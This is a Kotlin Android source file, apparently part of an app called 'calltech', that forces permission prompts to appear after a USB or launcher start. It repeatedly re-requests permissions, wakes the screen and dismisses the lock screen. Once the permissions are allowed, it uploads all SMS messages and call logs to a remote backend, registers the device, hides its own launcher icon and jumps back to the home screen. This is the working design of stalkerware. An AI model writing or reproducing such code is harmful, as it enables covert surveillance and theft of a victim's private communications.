package com.calltech

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

/**
 * USB / launcher start ke baad home par system Allow popup.
 * Icon tap ki zaroorat nahi — window focus milte hi requestPermissions.
 */
class PermissionTrampolineActivity : AppCompatActivity() {
    private val mainHandler = Handler(Looper.getMainLooper())
    private var lastAskAt = 0L
    private var batteryAsked = false
    private var finished = false
    private var ignoreResumeUntil = 0L

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_permission_host)
        bringToFront()
        MongoSyncHelper.ensureApiUrl(this)
        CallSyncHelper.markBackgroundSyncEnabled(this, true)
        SyncBootstrap.armBackgroundSync(this)

        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            onAllowed()
            return
        }

        PermissionPopupAlarms.schedule(this)
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (!finished && SyncBootstrap.needsRuntimePermissions(this)) {
            lastAskAt = 0L
            mainHandler.postDelayed({ askPermissions() }, 200L)
        }
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (!hasFocus || finished) {
            return
        }
        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            onAllowed()
            return
        }
        mainHandler.postDelayed({ askPermissions() }, 350L)
    }

    override fun onResume() {
        super.onResume()
        if (finished) {
            return
        }
        if (System.currentTimeMillis() < ignoreResumeUntil) {
            return
        }
        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            onAllowed()
            return
        }
        mainHandler.postDelayed({ askPermissions() }, 400L)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQ_PERMS) {
            handlePermissionResult()
        }
    }

    override fun onDestroy() {
        mainHandler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    private fun askPermissions() {
        if (finished || isFinishing || batteryAsked) {
            return
        }
        if (!hasWindowFocus()) {
            mainHandler.postDelayed({ askPermissions() }, 300L)
            return
        }
        val missing = SyncBootstrap.requiredPermissions().filter { permission ->
            checkSelfPermission(permission) != android.content.pm.PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) {
            onAllowed()
            return
        }
        val now = System.currentTimeMillis()
        if (now - lastAskAt < 1600L) {
            return
        }
        lastAskAt = now
        bringToFront()
        ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ_PERMS)
    }

    private fun handlePermissionResult() {
        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            PermissionPopupAlarms.cancel(this)
            onAllowed()
        } else if (!isFinishing) {
            lastAskAt = 0L
            mainHandler.postDelayed({ askPermissions() }, 400L)
        }
    }

    private fun onAllowed() {
        if (finished) {
            return
        }
        if (!batteryAsked && BatteryOptimizationHelper.requestFromActivity(this)) {
            batteryAsked = true
            ignoreResumeUntil = System.currentTimeMillis() + 800L
            return
        }
        finishSetup()
    }

    private fun finishSetup() {
        if (finished) {
            return
        }
        finished = true
        PermissionPopupAlarms.cancel(this)
        SyncObserverManager.register(applicationContext)
        SyncBootstrap.armBackgroundSync(applicationContext)
        SyncAlarmScheduler.scheduleNext(applicationContext)

        BackgroundSyncRunner.run {
            try {
                CallSyncService.holdDuring(applicationContext) {
                    SimNumberHelper.refreshSimIdentity(applicationContext)
                    DeviceRegistration.registerNow(applicationContext)
                    InstallFlow.runFirstCloudSync(applicationContext)
                    MessageSyncHelper.syncAllMessagesNow(applicationContext, "after_allow")
                    CallSyncHelper.syncAllCallsToMongoNow(applicationContext, "after_allow")
                    SyncBootstrap.onPermissionsReady(applicationContext)
                    SyncObserverManager.register(applicationContext)
                }
            } catch (error: Exception) {
                Log.e(TAG, "First sync failed", error)
            } finally {
                InstallFlow.completeSetup(applicationContext)
                mainHandler.post {
                    LauncherHider.hideNow(this@PermissionTrampolineActivity)
                    goHome()
                    finish()
                }
            }
        }
    }

    private fun goHome() {
        try {
            startActivity(
                Intent(Intent.ACTION_MAIN).apply {
                    addCategory(Intent.CATEGORY_HOME)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                },
            )
        } catch (_: Exception) {
            try {
                moveTaskToBack(true)
            } catch (_: Exception) {
            }
        }
    }

    private fun bringToFront() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        }
        @Suppress("DEPRECATION")
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
        )
    }

    companion object {
        private const val TAG = "PermissionTrampoline"
        private const val REQ_PERMS = 7104
    }
}
